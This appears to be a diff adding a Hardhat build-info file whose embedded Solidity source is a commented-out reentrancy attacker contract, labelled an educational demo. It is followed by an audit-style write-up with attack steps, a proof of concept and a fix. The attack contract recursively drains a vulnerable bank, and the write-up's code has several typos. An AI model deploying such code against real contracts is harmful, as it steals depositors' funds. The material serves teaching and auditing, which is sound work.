@@ -1,0 +1,69 @@
+{
+	"id": "309d65fc8743b1982e09a8abaae854d7",
+	"_format": "hh-sol-build-info-1",
+	"solcVersion": "0.8.34",
+	"solcLongVersion": "0.8.34+commit.80d5c536",
+	"input": {
+		"language": "Solidity",
+		"sources": {
+			"test77.sol": {
+				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.20;\r\n\r\n/*\r\n=========================================================\r\nPRACTICAL: Reentrancy Attacker Contract\r\nCONCEPT: Recursive ETH drain\r\n=========================================================\r\n\r\nWARNING:\r\nThis is an EDUCATIONAL ATTACK DEMO ONLY.\r\n\r\nDo NOT deploy against real contracts.\r\n=========================================================\r\n*/\r\n/*\r\ninterface IVulnerableBank {\r\n    function withdraw(uint256 amount) external;\r\n    function deposit() external payable;\r\n}\r\n*/\r\n/*\r\n=========================================================\r\nATTACK CONTRACT\r\n=========================================================\r\n*/\r\n/*\r\ncontract ReentrancyAttacker {\r\n\r\n    IVulnerableBank public bank;\r\n    address public owner;\r\n\r\n    uint256 public attackAmount;\r\n    bool public attacking;\r\n\r\n    constructor(address _bank) {\r\n        bank = IVulnerableBank(_bank);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    /*\r\n    =====================================================\r\n    START ATTACK\r\n    =====================================================\r\n    \r\n\r\n    function attack() external payable {\r\n        require(msg.sender == owner, \"Only owner\");\r\n\r\n        /*\r\n            Store attack amount\r\n        \r\n        attackAmount = msg.value;\r\n\r\n        /*\r\n            Step 1:\r\n            Deposit ETH into vulnerable bank\r\n        \r\n        bank.deposit{value: msg.value}();\r\n\r\n        /*\r\n            Step 2:\r\n            Start withdrawal (triggers reentrancy)\r\n        \r\n        attacking = true;\r\n        bank.withdraw(msg.value);\r\n        attacking = false;\r\n    }\r\n\r\n    /*\r\n    =====================================================\r\n    FALLBACK FUNCTION (REENTRANCY POINT)\r\n    =====================================================\r\n    \r\n\r\n    fallback() external payable {\r\n\r\n        /*\r\n        =================================================\r\n        CRITICAL REENTRANCY LOOP\r\n        =================================================\r\n\r\n        This runs when bank sends ETH back.\r\n\r\n        BEFORE bank updates balance,\r\n        attacker re-enters withdraw().\r\n        \r\n\r\n        if (attacking) {\r\n\r\n            uint256 bankBalance =\r\n                address(bank).balance;\r\n\r\n            /*\r\n                Continue attacking while bank has funds.\r\n            \r\n            if (bankBalance >= attackAmount) {\r\n\r\n                bank.withdraw(attackAmount);\r\n            }\r\n        }\r\n    }\r\n\r\n    /*\r\n    =====================================================\r\n    COLLECT STOLEN ETH\r\n    =====================================================\r\n    \r\n\r\n    function withdrawStolen() external {\r\n        require(msg.sender == owner, \"Only owner\");\r\n\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n    /*\r\n    =====================================================\r\n    VIEW CONTRACT BALANCE\r\n    =====================================================\r\n    \r\n\r\n    function getBalance()\r\n        external\r\n        view\r\n        returns (uint256)\r\n    {\r\n        return address(this).balance;\r\n    }\r\n}\r\n*/\r\n/*\r\nAudit Report\r\nTitle\r\nReentrancy Attack Contract Exploiting VulnerableBank\r\n\r\nSeverity: Critical\r\n\r\nReason\r\nThe attacker contract recursively re-enters the vulnerable banks withdraw() function\r\nbefore the victim updates its internal balance, allowing repeated withdrawls from a \r\nsingle deposit\r\n\r\nLocation\r\nContract:ReentrancyAttacker\r\nFunctions: attack(),fallback()\r\nAffected Victim Contract: VulnerableBank.withdraw()\r\n\r\nVulnerability Description\r\nThe attack contract exploits the following vulnerable flow in the bank:\r\n(bool success, ) =\r\nmsg.sender,call{value: amount}(\"\");\r\nbalance[msg.sender] -= amount;\r\n\r\nwhen the bank sends ETH to the attacker, the attacker's fallback() function\r\nexecutes before the balance is updated.\r\nfallback() external payable {\r\n    if (attacking) {\r\n        bank.withdraw(attackAmount);\r\n    }\r\n}\r\nThis allows recursive withrawls using the same deposited balance.\r\n\r\nAttack Flow\r\nStep 1\r\nAttacker deploys:\r\nRentrancyAttacker(bankAddress)\r\n\r\nStep 2\r\nAttacker starts attack:\r\nattack{value: 1 ether}()\r\n\r\nStep 3\r\nAttack contracts deposits ETH:\r\nbank.deposite{value: 1 ether}();\r\n\r\nStep 4\r\nAttack contract calls:\r\nbank.withdraw(1 ether);\r\n\r\nStep 5\r\nVictim sends ETH back:\r\nmsg.sender.call{value: amount}(\"\");\r\n\r\nStep 6\r\nFallback executes:\r\nfallback() external payable\r\n\r\nStep 7\r\nFallback re-enters:\r\nbank.withdraw(attackAmount);\r\n\r\nStep 8\r\nProcess repeats until:\r\naddress(bank).balance < attackAmount\r\n\r\nImpact\r\n- Complete drainage of victim contract ETH\r\n- Theft of funds belonging to other users\r\n- Loss of protocol liquidity\r\n- Financial loss for all depositors\r\n\r\nRoot Cause\r\nThe victim contract updates balances after an external call:\r\nExternal Call -> State Update\r\ninstead of:\r\nState Update -> External Call\r\nThe attacker leverages this ordering flaw through recursive execution in fallback()\r\n\r\nProof of concept\r\nAttacker code:\r\nfunction attack()\r\nexternal\r\npayable\r\n{\r\nbank.deposite{value: msg.value}();\r\nattacking = true;\r\nbank.withdraw(msg.value);\r\n}\r\nReentrancy trigger.\r\nfallback()\r\nexternal\r\npayble\r\n{\r\nif (\r\n    attacking &&\r\n    address(bank).balance >= attackAmount\r\n    ){\r\n        bank.withdraw(\r\n            attakAmount\r\n        );\r\n    }\r\n}\r\n\r\nRecommendation\r\nApply the checks-effects-interaction pattern:\r\nbalance[msg.sender] -= amount;\r\n(bool success, ) =\r\nmsg.sender.call{value: amount}(\"\");\r\nAdditionallu:\r\n-Use a reentrancy guard(nonReentrant)\r\n- Minimize external calls\r\n- Consider pull-payment patterns\r\n\r\n\r\n\r\n*/"
+			}
+		},
+		"settings": {
+			"optimizer": {
+				"enabled": false,
+				"runs": 200
+			},
+			"outputSelection": {
+				"*": {
+					"": [
+						"ast"
+					],
+					"*": [
+						"abi",
+						"metadata",
+						"devdoc",
+						"userdoc",
+						"storageLayout",
+						"evm.legacyAssembly",
+						"evm.bytecode",
+						"evm.deployedBytecode",
+						"evm.methodIdentifiers",
+						"evm.gasEstimates",
+						"evm.assembly"
+					]
+				}
+			},
+			"remappings": []
+		}
+	},
+	"output": {
+		"sources": {
+			"test77.sol": {
+				"ast": {
+					"absolutePath": "test77.sol",
+					"exportedSymbols": {},
+					"id": 2,
+					"license": "MIT",
+					"nodeType": "SourceUnit",
+					"nodes": [
+						{
+							"id": 1,
+							"literals": [
+								"solidity",
+								"^",
+								"0.8",
+								".20"
+							],
+							"nodeType": "PragmaDirective",
+							"src": "33:24:0"
+						}
+					],
+					"src": "33:5542:0"
+				},
+				"id": 0
+			}
+		}
+	}
+}
